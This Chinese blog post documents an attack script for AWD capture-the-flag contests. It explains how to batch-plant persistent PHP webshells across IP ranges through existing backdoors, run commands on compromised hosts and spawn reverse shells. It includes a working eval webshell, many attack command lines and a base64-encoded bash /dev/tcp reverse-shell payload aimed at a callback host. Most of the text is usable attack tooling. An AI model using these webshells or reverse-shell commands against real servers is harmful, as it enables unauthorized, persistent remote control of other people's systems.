---
title:  AWD工具
date: 2019-08-14 12:12:57
tags: 一些工具
description: awd_all_in_one
---

awd_all_in_one 是一个为awd比赛服务的脚本，旨在简化一些繁杂的批量代码编写,另外也是为了一些新手小白能好好体验下AWD的乐趣，当然学会写脚本是必须的，好的hacker必须是一个好的coder。注意：因为比赛调试需要，所有的脚本get、post请求都代理到了burp 即127.0.0.1 8080 如果不想改代码就开启burp（burp要添加127.0.0.1:8080监听）然后再运行脚本<!-- more -->
awd_all_in_one的功能主要是1、批量上传不死马，并且不死马的密码不一样 md5(ip+key) ，而且不同的密码不需要记录，因为都是md5(ip+key)生成，我们写批量脚本的时候直接自己生成密码即可。
2、批量执行函数，批量反弹shell
3、向文件追加内容并修改时间(这个现在还有缺陷，所以先不放了)

一共是三个模块 get post shell。前两个是写不死马一句话的(区别于一句话的GET 还是POST传参)，shell是个扩展函数 你可以用它来写一句话，也可以用它来执行系统命令 批量反弹shell 甚至 文件包含等，他只是提供了一个批量传值的功能，有疑问可以去看看 shell的函数。

这个脚本有16个参数需要传递，是不是被吓到了。不过别担心，下面我们就看下这些参数。

-ip                            指定目标ip
-ips                          指定目标ip段，支持192.168.253.1-3 和   									      192.168.253.0.1,192.168.253.2,192.168.253.3 两种参数传递方式
-port                         指定目标ip的端口 可以不传 默认是80
-ports                       指定多个端口 支持8080-8089 和 8088，8089两种传参方式。一般是用来测试    				那些自己搭建的AWD 没有多个ip      只能用端口来划分的awd测试
-f                              指定文件路径和文件名，这个参数是为了支持直接通过txt文本的读取来传马，txt				文件的格式如：http://192.168.1.1/1.php cmd
--dir                          已知一句话的路径（此路径是相对url访问来说的) 比如 已知一句话的地址是				     http://192.168.1.1/1.php 那么 --dir 1.php就可以了
--password              已知一句话对应的密码
--dir2                        要写入的路径（确保目录有可写入权限否则会报错，此路径是一直一句话路径的相对路径）
-key                         MD5加密的salt 可指定pass_base 1 ip 2 port 这样密码 也不需要保存 直接 				      python 生成就ok
--ptl                          网站所使用的协议 默认不传参为http
--pass_base            基于哪个来进行MD5 1 表示 ip 2 表示 port 默认是 1
-shell_method          shell传递形式 post 或者 get 默认是 post
-shell                        shell的值
-b64                         shell是否是base64传递进来的，简化一些传参的转义工作

上面就是所有的参数了，并不是所有参数都需要传递，但是建议传递所有的参数，下面我们举几个例子来用一下你就知道很简单了：

比如 我们已知 http://192.168.14.128/upload/bb-1.php 密码 cmd 是POST类型的
那么我们上传不死马需要这样玩儿
```powershell
python awd_all_in_one.py -ip 192.168.14.128 -port 80 --dir upload/aa-1.php --dir2 test_a.php --password cmd -key geez --ptl http --pass_base 1 -method post 
```

有些参数是默认的，当然绝大多数他们也是默认值那样，所以我们可以简化下
```powershell
python awd_all_in_one.py -ip 192.168.14.128 --dir upload/bb-1.php --dir2 test_a.php --password cmd -key geez
```
成功写入木马：
```php
<?php @eval($_POST['ee1dbe29997d539d4010c37e3ebab6a3']);?> 
```
地址：http://192.168.14.128/upload/test_a.php  
密码是由 192.168.14.128geez md5得来。同理我们可以指定port+salt的MD5值作为密码
我们也可以批量上传
```powershell
python awd_all_in_one.py -ips 192.168.14.133-134 -port 80 --dir upload/bb-1.php --dir2 test_a.php --password cmd -key geez --ptl http --pass_base 1 -method post 
```

我们也可以通过get 一句话木马 来批量上传 只需要改变 method 值为 get
比如 
```powershell
python awd_all_in_one.py -ips 192.168.14.133-135 -port 80 --dir upload/aa-1.php --dir2 ./a.php --password cmd -key geez --ptl http --pass_base 1 -method get
```

你也可以通过文件来上传：
```powershell
python awd_all_in_one.py -f test.txt --dir upload/aa-1.php --dir2 ./abbb.php --password cmd -key geez --ptl http --pass_base 1 -method get
```
```powershell
python awd_all_in_one.py -f test.txt --dir upload/bb-1.php --dir2 ./abbbccc.php --password cmd -key geez --ptl http --pass_base 1 -method post
```

我们还有一个模块是 shell 是用来执行自定义的命令和反弹shell使用的

单个执行
```powershell
python awd_all_in_one.py -ip 192.168.14.128 --dir upload/aa-1.php --password cmd -method shell -shell_method get -shell "system(whoami);"
```

批量执行
```powershell
python awd_all_in_one.py -ip 192.168.14.128 --dir upload/bb-1.php --password cmd -method shell -shell_method post -shell "system(whoami);"
```

反弹shell 管理shell的工具 这里就不提供了，可以用wangyihang写的那个Platypus：

``````powershell
python awd_all_in_one.py -ips 192.168.14.133-135 --dir upload/bb-1.php --password cmd -method shell -shell_method post -b64 1 -shell "c3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTQuMS85OTk5IDA+JjEnIik7"
```

-b64 1 表示 使用base64 传递 shell值 -shell_method 是一句话密码是GET 还是 POST 的区分

好了 如果你还需要扩展模块 只需要在主函数里面判断 传入的method 然后自己写一个函数进行调用就ok。当然目前这个脚本还是很low

